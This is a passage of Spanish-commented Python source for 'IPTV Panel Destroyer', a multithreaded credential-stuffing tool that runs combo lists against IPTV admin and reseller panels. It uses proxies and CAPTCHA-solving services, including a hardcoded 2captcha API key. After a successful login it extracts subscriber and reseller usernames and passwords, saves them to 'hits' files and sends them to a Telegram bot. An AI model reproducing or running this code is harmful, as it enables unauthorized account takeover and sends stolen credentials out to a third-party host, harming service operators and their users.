                    api_response = self.make_request('get', api_url, cookies=cookies, headers=req_headers)

                    if api_response and api_response.status_code == 200:
                        try:
                            temp_data = api_response.json()
                            if temp_data:
                                reseller_data = temp_data
                                logging.info(f"Datos de resellers obtenidos desde {api_url}")
                                break
                        except:
                            if 'reseller' in api_url and len(api_response.text) > 500:
                                reseller_data = {'html': api_response.text}
                                logging.info(f"Datos HTML de resellers obtenidos desde {api_url}")
                                break

                reseller_count = 0
                if reseller_data:
                    if isinstance(reseller_data, list):
                        reseller_count = len(reseller_data)
                    elif isinstance(reseller_data, dict):
                        if 'data' in reseller_data and isinstance(reseller_data['data'], list):
                            reseller_count = len(reseller_data['data'])
                        elif 'html' in reseller_data:
                            table_rows = re.findall(r'<tr[^>]*>.*?reseller.*?</tr>', reseller_data['html'], re.DOTALL | re.IGNORECASE)
                            reseller_count = len(table_rows)

                users_count = 'N/A'
                conns_count = 'N/A'
                online_count = 'N/A'
                server_status = 'N/A'

                if data_json:
                    users_count = data_json.get('users', data_json.get('total_users', 'N/A'))
                    conns_count = data_json.get('connections', data_json.get('total_connections', 'N/A'))
                    online_count = data_json.get('online_users', data_json.get('total_online', 'N/A'))
                    server_status = data_json.get('server_status', 'Running')
                elif data:
                    users_match = re.search(r'users.*?(\d+)', data.text.lower())
                    conns_match = re.search(r'connections.*?(\d+)', data.text.lower())
                    online_match = re.search(r'online.*?(\d+)', data.text.lower())

                    if users_match:
                        users_count = users_match.group(1)
                    if conns_match:
                        conns_count = conns_match.group(1)
                    if online_match:
                        online_count = online_match.group(1)

                panel_info = {
                    'active_accounts': users_count,
                    'open_connections': conns_count,
                    'online_users': online_count,
                    'credits': 'N/A',  
                    'is_admin': 'YES',
                    'resellers': reseller_count,
                    'server_status': server_status,
                    'm3u_host': 'N/A'
                }

                hit_message = f"""
    🔹Host: {current_url}
    🔹Username: {ruser}
    🔹Password: {rpass}
    🔹Panel Type: Administrator Panel
    🔹Active Accounts: {panel_info['active_accounts']}
    🔹Open Connections: {panel_info['open_connections']}
    🔹Online Users: {panel_info['online_users']}
    🔹Resellers: {panel_info['resellers']}
    🔹Server Status: {panel_info['server_status']}
    🔹Host M3U: {panel_info['m3u_host']}"""

                folder = urlparse(current_url).netloc.replace(":","_")
                folder = f"hits_paneles/{folder}"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M")

                safe_username = self.sanitize_filename(ruser)
                safe_password = self.sanitize_filename(rpass)
                filename = f"{folder}/hit_ADMIN_{safe_username}_{safe_password}_{timestamp}.txt"

                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("🔰 PANEL DESTROYER 🔰\n\n")
                    f.write(hit_message + "\n\n")

                    if reseller_data and isinstance(reseller_data, list) and len(reseller_data) > 0:
                        f.write("\nResellers encontrados:\n")
                        f.write("=" * 50 + "\n")
                        for i, reseller in enumerate(reseller_data[:10], 1):
                            if isinstance(reseller, dict):
                                f.write(f"{i}. Username: {reseller.get('username', 'N/A')}\n")
                                if 'credits' in reseller:
                                    f.write(f"   Credits: {reseller.get('credits', 'N/A')}\n")
                                if 'status' in reseller:
                                    f.write(f"   Status: {reseller.get('status', 'N/A')}\n")
                                f.write("-" * 30 + "\n")
                        if len(reseller_data) > 10:
                            f.write(f"\n... y {len(reseller_data) - 10} resellers más ...\n")

                    f.write("\n>> IPTV Panel Destroyer By JC <<\n")
                    f.write(f"___ Hit By: {self.hit_by}___\n")

                if self.telegram_enabled and self.telegram_token and self.telegram_chat_id:
                    telegram_message = f"""      🔰 PANEL DESTROYER 🔰
        {self.current_time}

        {hit_message}"""

                    if reseller_data and isinstance(reseller_data, list) and len(reseller_data) > 0:
                        telegram_message += "\n\nResellers encontrados:"
                        for i, reseller in enumerate(reseller_data[:5], 1):
                            if isinstance(reseller, dict):
                                username = reseller.get('username', 'N/A')
                                credits = reseller.get('credits', 'N/A')
                                telegram_message += f"\n{i}. {username} (Credits: {credits})"
                        if len(reseller_data) > 5:
                            telegram_message += f"\n... y {len(reseller_data) - 5} resellers más"

                    telegram_message += "\n\n>> IPTV Panel Destroyer By JC <<\n>>>> Hit By "+self.hit_by+"<<<<"

                    try:
                        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
                        response = requests.post(
                            url,
                            json={
                                "chat_id": self.telegram_chat_id,
                                "text": telegram_message
                            },
                            verify=False,
                            timeout=10
                        )
                        if response.status_code == 200:
                            logging.info("Hit enviado exitosamente a Telegram")
                        else:
                            logging.error(f"Error enviando a Telegram: {response.text}")
                    except Exception as e:
                        logging.error(f"Error enviando a Telegram: {str(e)}")

                self.successful_results.put({
                    'message': hit_message,
                    'panel_info': panel_info,
                    'resellers': reseller_data if isinstance(reseller_data, list) else [],
                    'accounts': [],
                    'timestamp': datetime.now().strftime("%Y-%m-%d -- %H:%M:%S"),
                    'url': current_url
                })

                return True

            else:

                api_endpoints = []

                if panel_type == "XUI":
                    api_endpoints = [
                        (f"{base_url}api?action=dashboard", headers),
                        (f"{base_url}dashboard", {}),
                        (f"{base_url}api/dashboard", headers),
                        (f"{base_url}panel_api.php", headers)
                    ]
                elif panel_type == 'XC':
                    api_endpoints = [
                        (f"{base_url}/api.php?action=reseller_dashboard", {}),
                        (f"{base_url}/api?action=dashboard", {}),
                        (f"{base_url}/api.php?action=dashboard", {}),
                        (f"{base_url}/panel_api.php", {})
                    ]

                for api_url, extra_headers in api_endpoints:
                    req_headers = headers.copy()
                    req_headers.update(extra_headers)

                    logging.info(f"Intentando obtener datos desde: {api_url}")
                    api_response = self.make_request('get', api_url, cookies=cookies, headers=req_headers)

                    if api_response and api_response.status_code == 200:
                        data = api_response
                        try:
                            data_json = data.json()
                            logging.info(f"Datos JSON obtenidos correctamente desde {api_url}")
                            break
                        except Exception as e:
                            logging.warning(f"No se pudieron convertir a JSON los datos de {api_url}: {str(e)}")
                            if 'dashboard' in api_url:
                                logging.info("Usando respuesta HTML para panel reseller/user")
                                break

                if data:
                    try:
                        if data_json:
                            panel_info = {
                                'active_accounts': data_json.get('active_accounts', 'N/A'),
                                'open_connections': data_json.get('open_connections', 'N/A'),
                                'online_users': data_json.get('online_users', 'N/A'),
                                'credits': data_json.get('credits', 'N/A'),
                                'is_admin': 'NO'
                            }
                        else:
                            panel_info = self.get_quick_dashboard_info(data)
                            panel_info['is_admin'] = 'NO'

                        accounts = []
                        accounts_file = None

                        print(f"{Fore.CYAN}🔄 Utilizando extractor integrado para obtener cuentas...{Style.RESET_ALL}")

                        try:

                            extractor = AccountExtractor(
                                url=current_url,
                                username=username,
                                password=password,
                                proxy_manager=self.proxy_manager,
                                verbose=False,
                                proxy_url=self.flaresolverr_proxy_url
                            )

                            if extractor.login():
                                extracted_accounts = extractor.extract_accounts()

                                if extracted_accounts:
                                    accounts = extracted_accounts
                                    accounts_file = extractor.save_accounts(accounts, username, password)
                                    print(f"{Fore.GREEN}✅ Extractor integrado: {len(accounts)} cuentas obtenidas{Style.RESET_ALL}")

                                    if panel_info.get('active_accounts', 'N/D') in ['N/D', 'N/A']:
                                        panel_info['active_accounts'] = str(len(accounts))
                                        panel_info['active_cons'] = str(len(accounts))
                                else:
                                    print(f"{Fore.YELLOW}⚠️ Extractor integrado: No se encontraron cuentas{Style.RESET_ALL}")
                            else:
                                print(f"{Fore.RED}❌ Error en login del extractor integrado{Style.RESET_ALL}")

                        except Exception as e:
                            print(f"{Fore.RED}❌ Error en extractor integrado: {str(e)}{Style.RESET_ALL}")
                            logging.error(f"Error en extractor integrado: {str(e)}")

                        users_url = f"{base_url}users.php" if panel_type == "XC" else f"{base_url}lines"
                        users_response = self.make_request('get', users_url, cookies=cookies)

                        m3u_host = ''
                        if users_response:
                            if panel_type == "XC":
                                m3u_host = self.buscarj(users_response.text, 'rText = "', '/get.php')
                            else:
                                m3u_host = self.buscarj(users_response.text, 'rText = "', '/" + $')

                            panel_info['m3u_host'] = m3u_host if m3u_host else 'N/A'

                        hit_message = f"""
    🔹Host: {current_url}
    🔹Username: {ruser}
    🔹Password: {rpass}
    🔹Active Accounts: {panel_info['active_accounts']}
    🔹Open Connections: {panel_info['open_connections']}
    🔹Online Users: {panel_info['online_users']}
    🔹Credits: {panel_info['credits']}
    🔹Is Admin: {panel_info['is_admin']}
    🔹Host M3U: {panel_info['m3u_host']}"""

                        if accounts:
                            hit_message += f"\n🎉 Cuentas extraídas: {len(accounts)}"
                            if accounts_file:
                                hit_message += f"\n📁 Archivo: {os.path.basename(accounts_file)}"

                        folder=urlparse(current_url).netloc.replace(":","_")
                        folder = f"hits_paneles/{folder}"
                        if not os.path.exists(folder):
                            os.makedirs(folder)
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M")
                        safe_username = self.sanitize_filename(ruser)
                        safe_password = self.sanitize_filename(rpass)
                        filename = f"{folder}/hit_{safe_username}_{safe_password}_{timestamp}.txt"

                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write("🔰 PANEL DESTROYER 🔰\n\n")
                            f.write(hit_message + "\n\n")

                            if accounts:
                                f.write("\nCuentas encontradas:\n")
                                f.write("=" * 50 + "\n")
                                for acc in accounts:
                                    f.write(f"Username: {acc.get('username', 'N/A')}\n")
                                    f.write(f"Password: {acc.get('password', 'N/A')}\n")
                                    f.write(f"Expires: {acc.get('expires', 'N/A')}\n")
                                    f.write(f"Status: {acc.get('status', 'N/A')}\n")
                                    f.write("-" * 30 + "\n")

                            f.write("\n>> IPTV Panel Destroyer By JC <<\n")
                            f.write(f"___ Hit By: {self.hit_by}___\n")

                        if self.telegram_enabled and self.telegram_token and self.telegram_chat_id:
                            telegram_message = f"""      🔰 PANEL DESTROYER 🔰
        {self.current_time}

        {hit_message}"""

                            if accounts:
                                telegram_message += "\n\nCuentas encontradas:"
                                for i, acc in enumerate(accounts[:5], 1):
                                    telegram_message += f"\n{i}. {acc.get('username', 'N/A')}:{acc.get('password', 'N/A')} ({acc.get('expires', 'N/A')})"
                                if len(accounts) > 5:
                                    telegram_message += f"\n... y {len(accounts)-5} más"

                            telegram_message += "\n\n>> IPTV Panel Destroyer By JC <<\n>>>> Hit By "+self.hit_by+"<<<<"

                            try:
                                url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
                                response = requests.post(
                                    url,
                                    json={
                                        "chat_id": self.telegram_chat_id,
                                        "text": telegram_message
                                    },
                                    verify=False,
                                    timeout=10
                                )
                                if response.status_code == 200:
                                    logging.info("Hit enviado exitosamente a Telegram")
                                else:
                                    logging.error(f"Error enviando a Telegram: {response.text}")
                            except Exception as e:
                                logging.error(f"Error enviando a Telegram: {str(e)}")

                        self.successful_results.put({
                            'message': hit_message,
                            'panel_info': panel_info,
                            'accounts': accounts,
                            'accounts_table': self.create_accounts_table(accounts) if accounts else None,
                            'timestamp': datetime.now().strftime("%Y-%m-%d -- %H:%M:%S"),
                            'url': current_url
                        })

                        return True

                    except Exception as e:
                        logging.error(f"Error procesando datos del panel: {str(e)}")
                        return False

                else:
                    logging.error("No se pudieron obtener datos del panel.")
                    return False

        except Exception as e:
            logging.error(f"Error en process_successful_login: {str(e)}")
            return False

    def get_quick_dashboard_info(self, response):
        try:
            info = {
                'active_accounts': 'N/A',
                'open_connections': 'N/A',
                'online_users': 'N/A',
                'credits': 'N/A',
                'is_admin': 'False',
                'm3u_host': 'N/A'
            }

            text = response.text.lower()

            patterns = {
                'active_accounts': [
                    r'active accounts[^\d]*(\d+)',
                    r'cuentas activas[^\d]*(\d+)',
                    r'active\s+(?:accounts?|lines?|users?)[^\d]*(\d+)',
                    r'(?:accounts?|lines?|users?)\s+active[^\d]*(\d+)'
                ],
                'online_users': [
                    r'online users[^\d]*(\d+)',
                    r'usuarios online[^\d]*(\d+)',
                    r'online\s+(?:users?|usuarios?)[^\d]*(\d+)'
                ],
                'open_connections': [
                    r'open connections[^\d]*(\d+)',
                    r'conexiones abiertas[^\d]*(\d+)',
                    r'connections[^\d]*(\d+)'
                ],
                'credits': [
                    r'credits[^\d]*(\d+)',
                    r'créditos[^\d]*(\d+)',
                    r'balance[^\d]*(\d+)',
                    r'saldo[^\d]*(\d+)'
                ]
            }

            for key, pattern_list in patterns.items():
                for pattern in pattern_list:
                    if info[key] == 'N/A':
                        match = re.search(pattern, text)
                        if match:
                            info[key] = match.group(1)
                            break

            admin_indicators = [
                'administrator', 'admin panel', 'admin dashboard',
                'system settings', 'manage_servers', 'manage reseller',
                'add reseller', 'bouquets', 'categories'
            ]

            if any(indicator in text for indicator in admin_indicators):
                info['is_admin'] = 'True'

            return info

        except Exception as e:
            logging.error(f"❌ Error en análisis rápido: {str(e)}")
            return {
                'active_accounts': 'N/A',
                'open_connections': 'N/A',
                'online_users': 'N/A', 
                'credits': 'N/A',
                'is_admin': 'False',
                'm3u_host': 'N/A'
            }

    def create_accounts_table(self, accounts):
        if not accounts:
            return "No se encontraron cuentas"

        try:

            table_data = []
            for i, acc in enumerate(accounts[:5], 1):  
                username = acc.get('username', 'N/A')[:15]
                password = acc.get('password', 'N/A')[:15] 
                status = acc.get('status', 'N/A')[:10]
                expires = acc.get('expires', 'N/A')[:12]

                table_data.append([i, username, password, status, expires])

            headers = ["#", "Usuario", "Password", "Status", "Expira"]

            try:
                from tabulate import tabulate
                table_str = tabulate(table_data, headers=headers, tablefmt="simple")
            except ImportError:

                table_str = f"{'#':<3} {'Usuario':<15} {'Password':<15} {'Status':<10} {'Expira':<12}\n"
                table_str += "-" * 60 + "\n"
                for row in table_data:
                    table_str += f"{row[0]:<3} {row[1]:<15} {row[2]:<15} {row[3]:<10} {row[4]:<12}\n"

            if len(accounts) > 5:
                table_str += f"\n... y {len(accounts) - 5} cuentas más ..."

            return table_str

        except Exception as e:
            return f"Error creando tabla: {str(e)}"

    def display_updated_tables(self):
        """Muestra las tablas actualizadas en tiempo real"""
        try:
            with self.tracking_lock:

                print("\n" * 3)

                elapsed_time = time.time() - self.start_time if self.start_time else 0
                print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}📊 ACTUALIZACIÓN EN TIEMPO REAL{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}✅ Hits: {self.hit}{Style.RESET_ALL} | {Fore.RED}❌ Fails: {self.fail}{Style.RESET_ALL} | {Fore.CYAN}⏱️ Tiempo: {self.format_time(int(elapsed_time))}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📋 Progreso: {self.stats['checked']}/{self.stats['total']} ({(self.stats['checked']/self.stats['total']*100) if self.stats['total'] > 0 else 0:.1f}%){Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

                self.show_reseller_hits_table()
                self.show_extracted_accounts_table()

                print(f"\n{Fore.YELLOW}⏳ El escaneo continúa en segundo plano...{Style.RESET_ALL}\n")

        except Exception as e:
            logging.error(f"Error actualizando tablas: {str(e)}")

    def show_reseller_hits_table(self):
        """Muestra tabla con los últimos 5 hits de resellers"""
        try:
            if not self.reseller_hits:
                return

            print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}📊 ÚLTIMOS 5 HITS DE RESELLERS{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}\n")

            recent_hits = self.reseller_hits[-5:][::-1]  

            table_data = []
            from urllib.parse import urlparse
            for i, hit in enumerate(recent_hits, 1):

                try:
                    parsed_url = urlparse(hit.get('host', ''))
                    server_host = parsed_url.netloc or hit.get('host', 'N/D')
                except:
                    server_host = hit.get('host', 'N/D')

                table_data.append([
                    i,
                    server_host[:25],
                    hit['username'][:15],
                    hit['panel_type'],
                    hit.get('credits', 'N/D')[:8],
                    hit.get('active_accounts', 'N/D')[:8],
                    hit.get('open_connections', 'N/D')[:8],
                    hit.get('online_users', 'N/D')[:8]
                ])

            headers = ["#", "Servidor", "Usuario", "Panel", "Créd", "Cuentas", "Conex", "Online"]

            try:
                from tabulate import tabulate
                table_str = tabulate(table_data, headers=headers, tablefmt="grid")
                print(table_str)
            except ImportError:

                print(f"{'#':<3} {'Servidor':<25} {'Usuario':<15} {'Panel':<6} {'Créd':<8} {'Cuentas':<8} {'Conex':<8} {'Online':<8}")
                print("-" * 95)
                for row in table_data:
                    print(f"{row[0]:<3} {row[1]:<25} {row[2]:<15} {row[3]:<6} {row[4]:<8} {row[5]:<8} {row[6]:<8} {row[7]:<8}")

            print(f"\n{Fore.GREEN}📈 Total de hits de resellers: {len(self.reseller_hits)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")

        except Exception as e:
            logging.error(f"Error mostrando tabla de hits: {str(e)}")

    def show_extracted_accounts_table(self):
        """Muestra tabla con las últimas 10 cuentas extraídas"""
        try:
            if not self.extracted_accounts:
                print(f"{Fore.YELLOW}⚠️ No hay cuentas extraídas para mostrar (lista vacía){Style.RESET_ALL}")
                return

            print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}👥 ÚLTIMAS 10 CUENTAS EXTRAÍDAS DE TODOS LOS RESELLERS{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}\n")

            recent_accounts = self.extracted_accounts[-10:][::-1]  

            table_data = []
            for i, account in enumerate(recent_accounts, 1):

                connections = f"{account['active_cons']}/{account['max_cons']}"

                table_data.append([
                    i,
                    account['reseller'][:15],
                    account['username'][:20],
                    account['expires'][:15],
                    account['status'][:10],
                    connections
                ])

            headers = ["#", "Reseller", "Usuario", "Expira", "Estado", "Con/Max"]

            try:
                from tabulate import tabulate
                table_str = tabulate(table_data, headers=headers, tablefmt="grid")
                print(table_str)
            except ImportError:

                print(f"{'#':<3} {'Reseller':<15} {'Usuario':<20} {'Expira':<15} {'Estado':<10} {'Con/Max':<8}")
                print("-" * 90)
                for row in table_data:
                    print(f"{row[0]:<3} {row[1]:<15} {row[2]:<20} {row[3]:<15} {row[4]:<10} {row[5]:<8}")

            print(f"\n{Fore.GREEN}📈 Total de cuentas extraídas: {len(self.extracted_accounts)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")

        except Exception as e:
            logging.error(f"Error mostrando tabla de cuentas: {str(e)}")

    def run_scanner(self):
        self.display_banner()
        self.configure_telegram()
        self.configure_user()

        combo_file = self.select_combo_file()
        self.combo_en_uso = f"{os.path.basename(combo_file)}"
        if not combo_file:
            return

        start_pos = self.get_valid_input(
            f"\n{Fore.GREEN}Ingrese la posición de inicio del combo: {Style.RESET_ALL}",
            input_type="int",
            min_val=0
        )
        if start_pos is None:
            return

        thread_count = self.get_valid_input(
            f"\n{Fore.GREEN}Ingrese el número de threads (1-300): {Style.RESET_ALL}",
            input_type="int",
            min_val=1,
            max_val=300
        )
        if thread_count is None:
            return

        print(f"\n{Fore.CYAN}Configuración del servidor")
        print(f"{Fore.YELLOW}1. Ingresar URL manualmente")
        print(f"2. Cargar URLs desde archivo{Style.RESET_ALL}")

        choice = self.get_valid_input(
            f"\n{Fore.GREEN}Seleccione una opción (1-2): {Style.RESET_ALL}",
            input_type="choice",
            valid_options=['1', '2']
        )
        if not choice:
            return

        current_url = None
        urls = []

        if choice == "1":
            current_url = self.validate_single_url()
            if current_url:
                urls = [current_url]
                self.server_url = current_url
            else:
                print(f"{Fore.RED}URL inválida{Style.RESET_ALL}")
                return
        elif choice == "2":
            urls = self.load_urls_from_file()
            if not urls:
                print(f"{Fore.RED}❌ No se cargaron URLs válidas{Style.RESET_ALL}")
                return

            print(f"\n{Fore.GREEN}✅ URLs cargadas: {len(urls)}{Style.RESET_ALL}")

            for i, url in enumerate(urls[:5], 1):
                print(f"{Fore.YELLOW}[{i}] {url}{Style.RESET_ALL}")
            if len(urls) > 5:
                print(f"{Fore.YELLOW}... y {len(urls) - 5} URLs más{Style.RESET_ALL}")

            self.server_url = urls[0]
        else:
            print(f"{Fore.RED}Opción inválida{Style.RESET_ALL}")
            return

        if not urls:
            print(f"{Fore.RED}No se encontraron URLs válidas{Style.RESET_ALL}")
            return

        use_proxies = self.configure_proxies()

        if len(urls) == 1:
            if hasattr(self, 'use_rescue_strategy') and self.use_rescue_strategy:
                print(f"\n{Fore.CYAN}🤖 Verificando balance de 2captcha para hits...{Style.RESET_ALL}")
                if not self.check_2captcha_balance():
                    choice_balance = self.get_valid_input(
                        f"{Fore.YELLOW}⚠️ Balance bajo. ¿Continuar? (s/n): {Style.RESET_ALL}",
                        input_type="choice",
                        valid_options=['s', 'n']
                    )
                    if choice_balance != 's':
                        return
        else:
            print(f"\n{Fore.CYAN}🤖 Verificando balance de 2captcha (recomendado para múltiples URLs)...{Style.RESET_ALL}")
            if not self.check_2captcha_balance():
                choice_balance = self.get_valid_input(
                    f"{Fore.YELLOW}⚠️ Balance bajo, algunos servidores pueden requerir reCAPTCHA. ¿Continuar? (s/n): {Style.RESET_ALL}",
                    input_type="choice",
                    valid_options=['s', 'n']
                )
                if choice_balance != 's':
                    return

        print(f"\n{Fore.CYAN}Configuración completada:")
        print(f"- Usuario: {self.hit_by}")
        print(f"- Combo: {os.path.basename(combo_file)}")
        print(f"- Posición inicial: {start_pos}")
        print(f"- Threads: {thread_count}")
        print(f"- URLs activas: {len(urls)}")

        if len(urls) > 1:
            print(f"- Modo: {Fore.CYAN}Múltiples servidores ({len(urls)} URLs){Style.RESET_ALL}")
            print(f"- Validación: Automática por servidor")
            print(f"- Rescue: Detección automática")
        else:
            if hasattr(self, 'use_rescue_strategy') and self.use_rescue_strategy:
                print(f"- Estrategia: {Fore.CYAN}Rescue Strategy Activa{Style.RESET_ALL}")
                print(f"- URL escaneo: {self.server_url}")
                print(f"- URL hits: {self.original_url}")
            else:
                print(f"- Server actual: {self.server_url}")
                print(f"- Estrategia: Normal")

        print(f"- Proxies: {'Activados' if use_proxies else 'Desactivados'}")
        print(f"- Telegram: {'Activado' if self.telegram_enabled else 'Desactivado'}")
        print(f"- API Key Captchaai: {CAPTCHAAI_API_KEY[:20]}...")
        print(f"- API Key 2captcha: {TWOCAPTCHA_API_KEY[:20]}...{Style.RESET_ALL}")

        input(f"\n{Fore.GREEN}Presione Enter para comenzar...{Style.RESET_ALL}")

        print(f"{Fore.CYAN}🔄 Leyendo archivo de combos...{Style.RESET_ALL}")

        try:
            with open(combo_file, 'r', encoding='utf-8') as f:
                combos = [line.strip() for line in f.readlines()[start_pos:] if line.strip()]

            print(f"{Fore.CYAN}📊 Combos cargados: {len(combos)}{Style.RESET_ALL}")

            if not combos:
                print(f"{Fore.RED}❌ No se encontraron combos válidos en el archivo{Style.RESET_ALL}")
                return

        except Exception as e:
            print(f"{Fore.RED}❌ Error leyendo archivo de combos: {str(e)}{Style.RESET_ALL}")
            return

        if len(urls) > 1:
            total_combinations = len(combos) * len(urls)
            print(f"{Fore.CYAN}🎯 Total combinaciones a procesar: {len(combos)} combos × {len(urls)} URLs = {total_combinations}{Style.RESET_ALL}")
        else:
            total_combinations = len(combos)
            print(f"{Fore.CYAN}🎯 Total combinaciones a procesar: {total_combinations}{Style.RESET_ALL}")

        self.stats = {
            'total': total_combinations,
            'checked': 0,
            'remaining': total_combinations
        }

        print(f"{Fore.CYAN}⏰ Iniciando escaneo...{Style.RESET_ALL}")
        self.start_time = time.time()
        self.scanning_complete = False
        self.active_threads = thread_count

        try:

            if len(urls) > 1:
                print(f"{Fore.CYAN}🔄 Modo: Múltiples servidores activado{Style.RESET_ALL}")
                self.scan_multiple_servers(combo_file, start_pos, thread_count, urls)
            else:
                print(f"{Fore.CYAN}🔄 Modo: Servidor único activado{Style.RESET_ALL}")
                self.work_queue = Queue()

                for combo in combos:
                    self.work_queue.put((self.server_url, combo))

                print(f"{Fore.CYAN}📋 Cola de trabajo creada: {self.work_queue.qsize()} tareas{Style.RESET_ALL}")

                threads = []

                monitor_thread = threading.Thread(target=self.monitor_progress, daemon=True)
                monitor_thread.start()
                print(f"{Fore.CYAN}🖥️ Monitor de progreso iniciado{Style.RESET_ALL}")

                for i in range(thread_count):
                    t = threading.Thread(
                        target=self.scan_worker,
                        args=(i + 1,),
                        daemon=True
                    )
                    threads.append(t)
                    t.start()

                print(f"{Fore.CYAN}🤖 {thread_count} workers iniciados{Style.RESET_ALL}")
                print(f"{Fore.GREEN}✅ Escaneo en progreso...{Style.RESET_ALL}")

                self.work_queue.join()
                self.scanning_complete = True

                for t in threads:
                    if t.is_alive():
                        t.join(timeout=2)

            print(f"\n{Fore.GREEN}🎉 Escaneo completado!{Style.RESET_ALL}")

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ Escaneo interrumpido por el usuario{Style.RESET_ALL}")
            self.scanning_complete = True

        except Exception as e:
            print(f"\n{Fore.RED}❌ Error durante el escaneo: {str(e)}{Style.RESET_ALL}")
            logging.error(f"Error en run_scanner: {str(e)}")
            self.scanning_complete = True

        finally:
            elapsed_time = time.time() - self.start_time if self.start_time else 0

            print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 ESTADÍSTICAS FINALES:{Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ Total hits: {self.hit}{Style.RESET_ALL}")
            print(f"{Fore.RED}❌ Total fails: {self.fail}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}🔸 Total custom: {self.custom}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}🔄 Total retries: {self.retries}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}⏱️ Tiempo total: {self.format_time(int(elapsed_time))}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}⚡ CPM promedio: {self.cpm}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📋 Combos procesados: {self.stats['checked']}/{self.stats['total']}{Style.RESET_ALL}")

            if len(urls) > 1:
                print(f"{Fore.CYAN}🌐 Modo utilizado: Múltiples servidores ({len(urls)} URLs){Style.RESET_ALL}")
                print(f"{Fore.CYAN}📊 Eficiencia: {(self.stats['checked']/(len(combos)*len(urls)))*100:.1f}% de combinaciones procesadas{Style.RESET_ALL}")
            else:
                if hasattr(self, 'use_rescue_strategy') and self.use_rescue_strategy:
                    print(f"{Fore.CYAN}🔄 Estrategia rescue utilizada{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🌐 Modo utilizado: Servidor único{Style.RESET_ALL}")

            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")

            if self.hit > 0:
                self.show_reseller_hits_table()
                self.show_extracted_accounts_table()

            if self.hit > 0:
                print(f"\n{Fore.GREEN}📁 Revisa la carpeta 'hits_paneles' para los resultados{Style.RESET_ALL}")

            if self.custom > 0:
                print(f"{Fore.YELLOW}📁 Revisa la carpeta 'hits_paneles/custom' para las cuentas custom{Style.RESET_ALL}")

            if self.hit > 0:
                success_rate = (self.hit / self.stats['checked']) * 100 if self.stats['checked'] > 0 else 0
                print(f"\n{Fore.GREEN}🎯 Tasa de éxito: {success_rate:.2f}% ({self.hit}/{self.stats['checked']}){Style.RESET_ALL}")

            if len(urls) > 1:
                print(f"{Fore.CYAN}💡 Tip: Los hits pueden provenir de diferentes servidores{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💡 Revisa los archivos individuales para ver qué servidor generó cada hit{Style.RESET_ALL}")

if __name__ == "__main__":

    try:
        from twocaptcha import TwoCaptcha
        print(f"{Fore.GREEN}✅ 2captcha disponible{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.RED}❌ Error: 'twocaptcha-python' no está instalado{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Instala con: pip install 2captcha-python{Style.RESET_ALL}")
        sys.exit(1)

    try:
        import captchaai
        print(f"{Fore.GREEN}✅ Captchaai disponible{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.YELLOW}⚠️ Captchaai no instalado (opcional){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Instala con: pip install captchaai{Style.RESET_ALL}")

    try:
        from bs4 import BeautifulSoup
        print(f"{Fore.GREEN}✅ BeautifulSoup disponible{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.RED}❌ Error: 'beautifulsoup4' no está instalado{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Instala con: pip install beautifulsoup4{Style.RESET_ALL}")
        sys.exit(1)

    try:
        from tabulate import tabulate
        print(f"{Fore.GREEN}✅ Tabulate disponible{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.YELLOW}⚠️ 'tabulate' no está instalado (opcional){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Instala con: pip install tabulate{Style.RESET_ALL}")

    if TWOCAPTCHA_API_KEY == "91edeaf848a293a6adcf19a8ff5eaf74":
        print(f"{Fore.YELLOW}⚠️ Usando API key por defecto de 2captcha{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Cambia TWOCAPTCHA_API_KEY al inicio del script si es necesario{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}🚀 Iniciando Panel Destroyer con Extractor Integrado...{Style.RESET_ALL}")
    scanner = PanelScanner()
    scanner.run_scanner()